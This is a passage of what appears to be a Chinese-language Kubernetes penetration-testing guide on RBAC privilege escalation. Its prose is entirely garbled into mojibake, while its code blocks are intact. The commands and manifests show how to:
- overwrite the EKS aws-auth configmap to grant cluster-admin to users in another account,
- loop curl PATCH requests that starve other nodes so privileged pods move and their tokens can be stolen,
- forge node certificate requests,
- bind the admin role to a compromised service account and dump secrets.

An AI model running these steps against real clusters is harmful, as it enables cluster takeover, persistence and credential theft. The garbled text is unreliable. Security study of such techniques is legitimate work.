æ‰¾åˆ°å…·æœ‰è¯»å–ç§˜å¯†æƒé™çš„ä»¤ç‰Œçš„æ”»å‡»è€…åœ¨ä¸çŸ¥é“å®Œæ•´ç§˜å¯†åç§°çš„æƒ…å†µä¸‹æ— æ³•ä½¿ç”¨æ­¤æƒé™ã€‚è¿™ä¸ªæƒé™ä¸ä¸Šé¢æè¿°çš„_**åˆ—å‡º**_ _**ç§˜å¯†**_æƒé™ä¸åŒã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/getting\_secret\_clusterRole.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRoleBinding\_with\_get\_secrets\_clusterRole.png)

å°½ç®¡æ”»å‡»è€…ä¸çŸ¥é“ç§˜å¯†çš„åç§°ï¼Œä½†å¯ä»¥åˆ—å‡ºé»˜è®¤çš„æœåŠ¡å¸æˆ·ã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/default\_service\_accounts\_list.png)

æ¯ä¸ªæœåŠ¡å¸æˆ·éƒ½æœ‰ä¸€ä¸ªå…³è”çš„ç§˜å¯†ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªé™æ€ï¼ˆä¸å˜ï¼‰å‰ç¼€å’Œä¸€ä¸ªéšæœºçš„äº”å­—ç¬¦å­—ç¬¦ä¸²ä»¤ç‰Œåç¼€ã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/default\_service\_account\_on\_kube\_system\_namespace-1024x556.png)

éšæœºä»¤ç‰Œç»“æ„æ˜¯ç”±å­—æ¯æ•°å­—å­—ç¬¦ï¼ˆå°å†™å­—æ¯å’Œæ•°å­—ï¼‰æ„æˆçš„5å­—ç¬¦å­—ç¬¦ä¸²ã€‚**ä½†å®ƒä¸åŒ…å«æ‰€æœ‰å­—æ¯å’Œæ•°å­—ã€‚**

æŸ¥çœ‹[æºä»£ç ](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83)æ—¶ï¼Œå¯ä»¥çœ‹åˆ°ä»¤ç‰Œä»…ç”±27ä¸ªå­—ç¬¦â€œbcdfghjklmnpqrstvwxz2456789â€ç”Ÿæˆï¼Œè€Œä¸æ˜¯36ä¸ªï¼ˆa-zå’Œ0-9ï¼‰ã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/character\_set\_from\_rand\_go.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/comments\_on\_removing\_characters\_rand\_go\_character\_set-1024x138.png)

è¿™æ„å‘³ç€ä»¤ç‰Œæœ‰14,348,907ç§å¯èƒ½æ€§ã€‚

æ”»å‡»è€…å¯ä»¥è¿è¡Œæš´åŠ›ç ´è§£æ”»å‡»æ¥çŒœæµ‹ä»¤ç‰ŒIDï¼Œå¤§çº¦éœ€è¦å‡ ä¸ªå°æ—¶çš„æ—¶é—´ã€‚æˆåŠŸä»é»˜è®¤æ•æ„ŸæœåŠ¡å¸æˆ·è·å–ç§˜å¯†å°†å…è®¸æ”»å‡»è€…æå‡æƒé™ã€‚

### è¯ä¹¦ç­¾åè¯·æ±‚

å¦‚æœåœ¨èµ„æº`certificatesigningrequests`ï¼ˆæˆ–è‡³å°‘åœ¨`certificatesigningrequests/nodeClient`ï¼‰ä¸­å…·æœ‰åŠ¨è¯**`create`**ï¼Œåˆ™å¯ä»¥**åˆ›å»º**ä¸€ä¸ªæ–°çš„èŠ‚ç‚¹çš„CeSRã€‚

æ ¹æ®[æ–‡æ¡£ï¼Œå¯ä»¥è‡ªåŠ¨æ‰¹å‡†è¿™äº›è¯·æ±‚](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/)ï¼Œå› æ­¤åœ¨è¿™ç§æƒ…å†µä¸‹**ä¸éœ€è¦é¢å¤–çš„æƒé™**ã€‚å¦‚æœä¸èƒ½è‡ªåŠ¨æ‰¹å‡†è¯·æ±‚ï¼Œåˆ™éœ€è¦èƒ½å¤Ÿæ‰¹å‡†è¯·æ±‚ï¼Œè¿™æ„å‘³ç€åœ¨`certificatesigningrequests/approval`å’Œ`signers`ä¸­ä½¿ç”¨èµ„æºåç§°`<signerNameDomain>/<signerNamePath>`æˆ–`<signerNameDomain>/*`è¿›è¡Œæ›´æ–°å’Œæ‰¹å‡†ã€‚

ä¸€ä¸ªå…·æœ‰æ‰€æœ‰æ‰€éœ€æƒé™çš„**è§’è‰²ç¤ºä¾‹**å¦‚ä¸‹ï¼š
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
æ‰€ä»¥ï¼Œé€šè¿‡æ‰¹å‡†æ–°çš„èŠ‚ç‚¹CSRï¼Œæ‚¨å¯ä»¥æ»¥ç”¨èŠ‚ç‚¹çš„ç‰¹æ®Šæƒé™æ¥çªƒå–æœºå¯†ä¿¡æ¯å¹¶æå‡æƒé™ã€‚

åœ¨[**è¿™ç¯‡æ–‡ç« **](https://www.4armed.com/blog/hacking-kubelet-on-gke/)å’Œ[**è¿™ç¯‡æ–‡ç« **](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/)ä¸­ï¼ŒGKE K8s TLSå¼•å¯¼é…ç½®è¢«é…ç½®ä¸º**è‡ªåŠ¨ç­¾å**ï¼Œå¹¶è¢«æ»¥ç”¨ä»¥ç”Ÿæˆæ–°çš„K8sèŠ‚ç‚¹çš„å‡­æ®ï¼Œç„¶åé€šè¿‡çªƒå–æœºå¯†ä¿¡æ¯æ¥æå‡æƒé™ã€‚\
å¦‚æœæ‚¨**æ‹¥æœ‰ä¸Šè¿°æƒé™ï¼Œæ‚¨ä¹Ÿå¯ä»¥åšåŒæ ·çš„äº‹æƒ…**ã€‚è¯·æ³¨æ„ï¼Œç¬¬ä¸€ä¸ªç¤ºä¾‹ç»•è¿‡äº†é˜»æ­¢æ–°èŠ‚ç‚¹è®¿é—®å®¹å™¨å†…éƒ¨æœºå¯†ä¿¡æ¯çš„é”™è¯¯ï¼Œå› ä¸º**èŠ‚ç‚¹åªèƒ½è®¿é—®æŒ‚è½½åœ¨å…¶ä¸Šçš„å®¹å™¨çš„æœºå¯†ä¿¡æ¯**ã€‚

ç»•è¿‡æ­¤é™åˆ¶çš„æ–¹æ³•åªæ˜¯**ä¸ºæŒ‚è½½æœ‰æœ‰è¶£æœºå¯†ä¿¡æ¯çš„å®¹å™¨æ‰€åœ¨çš„èŠ‚ç‚¹åç§°åˆ›å»ºèŠ‚ç‚¹å‡­æ®**ï¼ˆä½†è¯·å‚è€ƒç¬¬ä¸€ç¯‡æ–‡ç« ä¸­çš„æ“ä½œæ–¹æ³•ï¼‰ï¼š
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

åœ¨ EKSï¼ˆéœ€è¦åœ¨ AWS ä¸­ï¼‰é›†ç¾¤ä¸Šï¼Œå¯ä»¥ä¿®æ”¹ kube-system å‘½åç©ºé—´ä¸­çš„ **`configmaps`** çš„ä¸»ä½“å¯ä»¥é€šè¿‡è¦†ç›– **aws-auth** configmap æ¥è·å¾—é›†ç¾¤ç®¡ç†å‘˜æƒé™ã€‚
æ‰€éœ€çš„åŠ¨è¯æ˜¯ **`update`** å’Œ **`patch`**ï¼Œæˆ–è€…å¦‚æœ configmap å°šæœªåˆ›å»ºï¼Œåˆ™æ˜¯ **`create`**ï¼š

{% code overflow="wrap" %}
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
æ‚¨å¯ä»¥ä½¿ç”¨ **`aws-auth`** è¿›è¡Œ **æŒä¹…æ€§**ï¼Œä»è€Œä½¿ç”¨æˆ·å¯ä»¥ä» **å…¶ä»–è´¦æˆ·** è®¿é—®ã€‚

ä½†æ˜¯ï¼Œ`aws --profile other_account eks update-kubeconfig --name <cluster-name>` **æ— æ³•ä»ä¸åŒçš„è´¦æˆ·** è¿›è¡Œæ“ä½œã€‚ä½†å®é™…ä¸Šï¼Œå¦‚æœæ‚¨å°†é›†ç¾¤çš„ ARN æ”¾åœ¨åç§°ä¹‹å‰ï¼Œ`aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` å°±å¯ä»¥å·¥ä½œã€‚\
è¦ä½¿ `kubectl` å·¥ä½œï¼Œåªéœ€ç¡®ä¿ **é…ç½®å—å®³è€…çš„ kubeconfig**ï¼Œå¹¶åœ¨ aws exec args ä¸­æ·»åŠ  `--profile other_account_role`ï¼Œè¿™æ · kubectl å°†ä½¿ç”¨å…¶ä»–è´¦æˆ·é…ç½®æ–‡ä»¶è·å–ä»¤ç‰Œå¹¶ä¸ AWS è¿›è¡Œé€šä¿¡ã€‚
{% endhint %}

### åœ¨ GKE ä¸­å‡çº§æƒé™

æœ‰**ä¸¤ç§æ–¹æ³•**å¯ä»¥å°† K8s æƒé™åˆ†é…ç»™ GCP ä¸»ä½“ã€‚åœ¨ä»»ä½•æƒ…å†µä¸‹ï¼Œä¸»ä½“è¿˜éœ€è¦å…·æœ‰æƒé™ **`container.clusters.get`**ï¼Œä»¥ä¾¿èƒ½å¤Ÿæ”¶é›†è®¿é—®é›†ç¾¤çš„å‡­æ®ï¼Œå¦åˆ™æ‚¨å°†éœ€è¦**ç”Ÿæˆè‡ªå·±çš„ kubectl é…ç½®æ–‡ä»¶**ï¼ˆè¯·å‚é˜…ä¸‹é¢çš„é“¾æ¥ï¼‰ã€‚

{% hint style="warning" %}
åœ¨ä¸ K8s API ç«¯ç‚¹é€šä¿¡æ—¶ï¼Œå°†å‘é€ GCP èº«ä»½éªŒè¯ä»¤ç‰Œã€‚ç„¶åï¼ŒGCP é€šè¿‡ K8s API ç«¯ç‚¹é¦–å…ˆæ£€æŸ¥ä¸»ä½“ï¼ˆé€šè¿‡ç”µå­é‚®ä»¶ï¼‰æ˜¯å¦åœ¨é›†ç¾¤å†…å…·æœ‰ä»»ä½•è®¿é—®æƒé™ï¼Œç„¶åå†æ£€æŸ¥æ˜¯å¦é€šè¿‡ GCP IAM å…·æœ‰ä»»ä½•è®¿é—®æƒé™ã€‚\
å¦‚æœå…¶ä¸­**ä»»ä½•ä¸€ä¸ª**ä¸º**true**ï¼Œåˆ™ä¼š**å“åº”**ã€‚å¦‚æœ**ä¸æ˜¯**ï¼Œåˆ™ä¼šç»™å‡ºä¸€ä¸ªé”™è¯¯ï¼Œå»ºè®®é€šè¿‡ GCP IAM æˆäºˆæƒé™ã€‚
{% endhint %}

ç„¶åï¼Œç¬¬ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨ **GCP IAM**ï¼ŒK8s æƒé™å…·æœ‰å…¶**ç­‰æ•ˆçš„ GCP IAM æƒé™**ï¼Œå¦‚æœä¸»ä½“å…·æœ‰è¿™äº›æƒé™ï¼Œåˆ™å¯ä»¥ä½¿ç”¨å®ƒä»¬ã€‚

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

ç¬¬äºŒç§æ–¹æ³•æ˜¯å°† K8s æƒé™åˆ†é…ç»™é€šè¿‡å…¶**ç”µå­é‚®ä»¶**è¿›è¡Œæ ‡è¯†çš„ç”¨æˆ·ï¼ˆåŒ…æ‹¬ GCP æœåŠ¡å¸æˆ·ï¼‰ã€‚

### åˆ›å»º serviceaccounts token

å¯ä»¥**åˆ›å»º TokenRequests**ï¼ˆ`serviceaccounts/token`ï¼‰çš„ä¸»ä½“å¯ä»¥ä¸ºå…·æœ‰ç®¡ç†å‘˜æƒé™çš„ SAs å‘è¡Œä»¤ç‰Œï¼ˆæ¥è‡ª[**æ­¤å¤„**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)çš„ä¿¡æ¯ï¼‰ã€‚

### ephemeralcontainers

å¯ä»¥**`update`** æˆ– **`patch`** **`pods/ephemeralcontainers`** çš„ä¸»ä½“å¯ä»¥åœ¨å…¶ä»– pod ä¸Šè·å¾—**ä»£ç æ‰§è¡Œ**çš„æƒé™ï¼Œå¹¶ä¸”å¯èƒ½é€šè¿‡æ·»åŠ å…·æœ‰ç‰¹æƒ securityContext çš„ä¸´æ—¶å®¹å™¨æ¥**çªç ´**åˆ°å…¶èŠ‚ç‚¹ã€‚

### ValidatingWebhookConfigurations æˆ– MutatingWebhookConfigurations

å…·æœ‰ `validatingwebhookconfigurations` æˆ– `mutatingwebhookconfigurations` ä¸Šçš„ä»»ä½•ä¸€ä¸ªåŠ¨è¯ `create`ã€`update` æˆ– `patch` çš„ä¸»ä½“å¯èƒ½èƒ½å¤Ÿ**åˆ›å»ºæ­¤ç±» webhookconfigurations**ï¼Œä»¥ä¾¿èƒ½å¤Ÿ**å‡çº§æƒé™**ã€‚

æœ‰å…³ [`mutatingwebhookconfigurations` ç¤ºä¾‹ï¼Œè¯·æŸ¥çœ‹æ­¤å¸–å­çš„æ­¤éƒ¨åˆ†](./#malicious-admission-controller)ã€‚

### å‡çº§

æ­£å¦‚æ‚¨åœ¨ä¸‹ä¸€èŠ‚ä¸­æ‰€è¯»åˆ°çš„ï¼š[**å†…ç½®çš„ç‰¹æƒå‡çº§é¢„é˜²**](./#built-in-privileged-escalation-prevention)ï¼Œä¸»ä½“æ— æ³•åœ¨æ²¡æœ‰è‡ªå·±å…·å¤‡è¿™äº›æ–°æƒé™çš„æƒ…å†µä¸‹æ›´æ–°æˆ–åˆ›å»ºè§’è‰²æˆ–é›†ç¾¤è§’è‰²ã€‚é™¤éä»–åœ¨ **`roles`** æˆ– **`clusterroles`** ä¸Šå…·æœ‰ **`escalate`** åŠ¨è¯ã€‚\
ç„¶åï¼Œä»–å¯ä»¥æ›´æ–°/åˆ›å»ºå…·æœ‰æ¯”ä»–è‡ªå·±æƒé™æ›´é«˜çš„æ–°è§’è‰²å’Œé›†ç¾¤è§’è‰²ã€‚

### èŠ‚ç‚¹ä»£ç†

å…·æœ‰è®¿é—® **`nodes/proxy`** å­èµ„æºçš„ä¸»ä½“å¯ä»¥é€šè¿‡ Kubelet API åœ¨ pod ä¸Šæ‰§è¡Œä»£ç ï¼ˆæ ¹æ®[**æ­¤å¤„**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)ï¼‰ã€‚æœ‰å…³ Kubelet èº«ä»½éªŒè¯çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…æ­¤é¡µé¢ï¼š

{% content-ref url="../../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

æ‚¨å¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ°å¦‚ä½•é€šè¿‡æˆæƒä¸ Kubelet API è¿›è¡Œé€šä¿¡çš„ç¤ºä¾‹ï¼š[**åœ¨æ­¤å¤„è·å– RCE çš„ç¤ºä¾‹**](../pentesting-kubernetes-services.md#kubelet-rce)ã€‚

### åˆ é™¤ pods + ä¸å¯è°ƒåº¦çš„èŠ‚ç‚¹

å¯ä»¥**åˆ é™¤ pods**ï¼ˆå¯¹ `pods` èµ„æºçš„ `delete` åŠ¨è¯ï¼‰ï¼Œæˆ–**é©±é€ pods**ï¼ˆå¯¹ `pods/eviction` èµ„æºçš„ `create` åŠ¨è¯ï¼‰ï¼Œæˆ–**æ›´æ”¹ pod çŠ¶æ€**ï¼ˆè®¿é—® `pods/status`ï¼‰ï¼Œå¹¶ä¸”å¯ä»¥**ä½¿å…¶ä»–èŠ‚ç‚¹ä¸å¯è°ƒåº¦**ï¼ˆè®¿é—® `nodes/status`ï¼‰ï¼Œæˆ–**åˆ é™¤èŠ‚ç‚¹**ï¼ˆå¯¹ `nodes` èµ„æºçš„ `delete` åŠ¨è¯ï¼‰å¹¶ä¸”å¯¹ pod å…·æœ‰æ§åˆ¶æƒçš„ä¸»ä½“ï¼Œå¯ä»¥**çªƒå–å…¶ä»–èŠ‚ç‚¹ä¸Šçš„ pods**ï¼Œä»¥ä¾¿åœ¨**å—æŸçš„èŠ‚ç‚¹**ä¸Š**æ‰§è¡Œ**å®ƒä»¬ï¼Œå¹¶ä¸”æ”»å‡»è€…å¯ä»¥ä»è¿™äº› pods ä¸­**çªƒå–ä»¤ç‰Œ**ã€‚
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### æœåŠ¡çŠ¶æ€ (CVE-2020-8554)

å¯ä»¥**ä¿®æ”¹** **`services/status`** çš„ä¸»ä½“å¯ä»¥å°† `status.loadBalancer.ingress.ip` å­—æ®µè®¾ç½®ä¸ºåˆ©ç”¨æœªä¿®å¤çš„ CVE-2020-8554 å¹¶å¯¹é›†ç¾¤å‘èµ·ä¸­é—´äººæ”»å‡»ã€‚å¤§å¤šæ•°é’ˆå¯¹ CVE-2020-8554 çš„ç¼“è§£æªæ–½åªèƒ½é˜²æ­¢ ExternalIP æœåŠ¡ (æ ¹æ® [**è¿™é‡Œ**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego))ã€‚

### èŠ‚ç‚¹å’Œ Pod çŠ¶æ€

å…·æœ‰ **`update`** æˆ– **`patch`** æƒé™çš„ä¸»ä½“å¯ä»¥ä¿®æ”¹æ ‡ç­¾ä»¥å½±å“å¼ºåˆ¶æ‰§è¡Œçš„è°ƒåº¦çº¦æŸã€‚

## å†…ç½®ç‰¹æƒå‡çº§é¢„é˜²

å°½ç®¡å¯èƒ½å­˜åœ¨é£é™©çš„æƒé™ï¼ŒKubernetes åœ¨é˜²æ­¢å…¶ä»–ç±»å‹çš„æƒé™ç‰¹æƒå‡çº§æ–¹é¢åšå¾—å¾ˆå¥½ã€‚

Kubernetes æœ‰ä¸€ä¸ª[å†…ç½®æœºåˆ¶](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping)æ¥å®ç°è¿™ä¸€ç‚¹ï¼š

> RBAC API é€šè¿‡ç¼–è¾‘è§’è‰²æˆ–è§’è‰²ç»‘å®šæ¥**é˜²æ­¢ç”¨æˆ·æå‡æƒé™**ã€‚å› ä¸ºè¿™æ˜¯åœ¨ API çº§åˆ«å¼ºåˆ¶æ‰§è¡Œçš„ï¼Œæ‰€ä»¥å³ä½¿ RBAC æˆæƒå™¨æœªä½¿ç”¨ï¼Œå®ƒä¹Ÿé€‚ç”¨ã€‚
>
> ç”¨æˆ·åªèƒ½åœ¨ä»–ä»¬å·²ç»å…·æœ‰ä¸è§’è‰²ç›¸åŒèŒƒå›´çš„æ‰€æœ‰æƒé™çš„æƒ…å†µä¸‹ï¼Œæ‰èƒ½**åˆ›å»º/æ›´æ–°è§’è‰²**ï¼ˆå¯¹äº ClusterRole æ¥è¯´æ˜¯é›†ç¾¤èŒƒå›´ï¼Œå¯¹äº Role æ¥è¯´æ˜¯ç›¸åŒçš„å‘½åç©ºé—´æˆ–é›†ç¾¤èŒƒå›´ï¼‰

{% hint style="warning" %}
ä¸Šè¿°è§„åˆ™æœ‰ä¸€ä¸ªä¾‹å¤–ã€‚å¦‚æœä¸»ä½“å¯¹ **`roles`** æˆ– **`clusterroles`** æœ‰ **`escalate`** åŠ¨è¯æƒé™ï¼Œå³ä½¿æ²¡æœ‰è‡ªå·±çš„æƒé™ï¼Œä¹Ÿå¯ä»¥å¢åŠ è§’è‰²å’Œé›†ç¾¤è§’è‰²çš„æƒé™ã€‚
{% endhint %}

è®©æˆ‘ä»¬çœ‹ä¸€ä¸ªæ­¤ç±»é¢„é˜²çš„ç¤ºä¾‹ã€‚

åä¸º _sa7_ çš„æœåŠ¡è´¦æˆ·ä½äº RoleBinding _edit-role-rolebinding_ ä¸­ã€‚è¯¥ RoleBinding å¯¹è±¡å…·æœ‰åä¸º _edit-role_ çš„è§’è‰²ï¼Œè¯¥è§’è‰²åœ¨ _default_ å‘½åç©ºé—´ä¸­å…·æœ‰**å®Œå…¨æƒé™è§„åˆ™**ã€‚ç†è®ºä¸Šï¼Œè¿™æ„å‘³ç€è¯¥æœåŠ¡è´¦æˆ·å¯ä»¥**ç¼–è¾‘** _default_ å‘½åç©ºé—´ä¸­çš„**ä»»ä½•è§’è‰²**ã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/edit\_roles\_roleBinding\_binding\_sa7\_to\_edit\_role.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/role\_to\_edit\_any\_role.png)

è¿˜æœ‰ä¸€ä¸ªåä¸º _list-pods_ çš„ç°æœ‰è§’è‰²ã€‚æ‹¥æœ‰æ­¤è§’è‰²çš„ä»»ä½•äººéƒ½å¯ä»¥åˆ—å‡º _default_ å‘½åç©ºé—´ä¸­çš„æ‰€æœ‰ Podã€‚ç”¨æˆ· _sa7_ åº”è¯¥å…·æœ‰ç¼–è¾‘ä»»ä½•è§’è‰²çš„æƒé™ï¼Œå› æ­¤è®©æˆ‘ä»¬çœ‹çœ‹å½“å®ƒå°è¯•å°† "secrets" èµ„æºæ·»åŠ åˆ°è§’è‰²çš„èµ„æºæ—¶ä¼šå‘ç”Ÿä»€ä¹ˆã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/edit\_role\_resources-300x66.png)

åœ¨å°è¯•è¿™æ ·åšåï¼Œæˆ‘ä»¬å°†æ”¶åˆ°ä¸€ä¸ªé”™è¯¯æ¶ˆæ¯ "forbidden: attempt to grant extra privileges"ï¼ˆå›¾ 31ï¼‰ï¼Œå› ä¸ºå°½ç®¡æˆ‘ä»¬çš„ _sa7_ ç”¨æˆ·å…·æœ‰æ›´æ–°ä»»ä½•èµ„æºçš„è§’è‰²çš„æƒé™ï¼Œä½†å®ƒåªèƒ½æ›´æ–°å®ƒå…·æœ‰æƒé™çš„èµ„æºçš„è§’è‰²ã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/forbidden\_attempt\_to\_gran\_extra\_privileges\_message-1024x288.png)

### **è·å–å’Œä¿®æ”¹ RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**æ˜¾ç„¶ï¼Œè¿™ä¸ªæŠ€æœ¯ä»¥å‰æ˜¯æœ‰æ•ˆçš„ï¼Œä½†æ ¹æ®æˆ‘çš„æµ‹è¯•ï¼Œç”±äºå‰é¢éƒ¨åˆ†è§£é‡Šçš„ç›¸åŒåŸå› ï¼Œå®ƒç°åœ¨ä¸å†æœ‰æ•ˆã€‚å¦‚æœæ²¡æœ‰æƒé™ï¼Œä½ ä¸èƒ½åˆ›å»º/ä¿®æ”¹ä¸€ä¸ª rolebinding æ¥ç»™è‡ªå·±æˆ–å…¶ä»–æœåŠ¡è´¦æˆ·æˆäºˆä¸€äº›æƒé™ã€‚**
{% endhint %}

æ‹¥æœ‰åˆ›å»º Rolebindings çš„æƒé™å…è®¸ç”¨æˆ·**å°†è§’è‰²ç»‘å®šåˆ°æœåŠ¡è´¦æˆ·**ã€‚è¿™ä¸ªæƒé™å¯èƒ½å¯¼è‡´æƒé™å‡çº§ï¼Œå› ä¸ºå®ƒ**å…è®¸ç”¨æˆ·å°†ç®¡ç†å‘˜æƒé™ç»‘å®šåˆ°è¢«å…¥ä¾µçš„æœåŠ¡è´¦æˆ·**ã€‚

ä»¥ä¸‹ ClusterRole ä½¿ç”¨äº†ç‰¹æ®Šçš„åŠ¨è¯ _bind_ï¼Œå…è®¸ç”¨æˆ·åˆ›å»ºä¸€ä¸ªå…·æœ‰ _admin_ ClusterRoleï¼ˆé»˜è®¤é«˜æƒé™è§’è‰²ï¼‰çš„ RoleBindingï¼Œå¹¶å°†ä»»ä½•ç”¨æˆ·ï¼ˆåŒ…æ‹¬è‡ªå·±ï¼‰æ·»åŠ åˆ°æ­¤ç®¡ç†å‘˜ ClusterRole ä¸­ã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_with\_bind\_verb.png)

ç„¶åå¯ä»¥åˆ›å»º **`malicious-RoleBinging.json`**ï¼Œå°†ç®¡ç†å‘˜è§’è‰²ç»‘å®šåˆ°å…¶ä»–è¢«å…¥ä¾µçš„æœåŠ¡è´¦æˆ·ï¼š
```javascript
{
"apiVersion": "rbac.authorization.k8s.io/v1",
"kind": "RoleBinding",
"metadata": {
"name": "malicious-rolebinding",
"namespaces": "default"
},
"roleRef": {
"apiGroup": "*",
"kind": "ClusterRole",
"name": "admin"
},
"subjects": [
{
"kind": "ServiceAccount",
"name": "compromised-svc"
"namespace": "default"
}
]
}
```
è¿™ä¸ªJSONæ–‡ä»¶çš„ç›®çš„æ˜¯å°†ç®¡ç†å‘˜â€œClusterRoleâ€ï¼ˆç¬¬11è¡Œï¼‰ç»‘å®šåˆ°è¢«æ”»é™·çš„æœåŠ¡è´¦æˆ·ï¼ˆç¬¬16è¡Œï¼‰ã€‚

ç°åœ¨ï¼Œæˆ‘ä»¬åªéœ€è¦ä½¿ç”¨ä»¥ä¸‹CURLå‘½ä»¤å°†æˆ‘ä»¬çš„JSONä½œä¸ºPOSTè¯·æ±‚å‘é€åˆ°APIå³å¯ï¼š
```bash
curl -k -v -X POST -H "Authorization: Bearer <JWT TOKEN>" \
-H "Content-Type: application/json" \
https://<master_ip>:<port>/apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings \
-d @malicious-RoleBinging.json
```
åœ¨å°†**adminè§’è‰²ç»‘å®šåˆ°â€œcompromised-svcâ€æœåŠ¡è´¦æˆ·**ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¢«å…¥ä¾µçš„æœåŠ¡è´¦æˆ·ä»¤ç‰Œæ¥**åˆ—å‡ºç§˜å¯†ä¿¡æ¯**ã€‚ä»¥ä¸‹CURLå‘½ä»¤å¯ä»¥å®ç°æ­¤åŠŸèƒ½ï¼š
```bash
curl -k -v -X POST -H "Authorization: Bearer <COMPROMISED JWT TOKEN>"\
-H "Content-Type: application/json"
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secret
```
## å…¶ä»–æ”»å‡»

### æ—è·¯ä»£ç†åº”ç”¨

é»˜è®¤æƒ…å†µä¸‹ï¼ŒPodä¹‹é—´çš„é€šä¿¡æ²¡æœ‰ä»»ä½•åŠ å¯†ã€‚åŒå‘è®¤è¯ï¼ŒPodå¯¹Podã€‚

#### åˆ›å»ºæ—è·¯ä»£ç†åº”ç”¨ <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

åˆ›å»ºä½ çš„ .yaml æ–‡ä»¶
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
ç¼–è¾‘æ‚¨çš„ .yaml æ–‡ä»¶å¹¶å–æ¶ˆæ³¨é‡Šä»¥ä¸‹è¡Œï¼š
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
æŸ¥çœ‹ä»£ç†çš„æ—¥å¿—ï¼š
```bash
kubectl logs app -C proxy
```
æ›´å¤šä¿¡æ¯è¯·å‚è€ƒï¼š[https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### æ¶æ„å‡†å…¥æ§åˆ¶å™¨

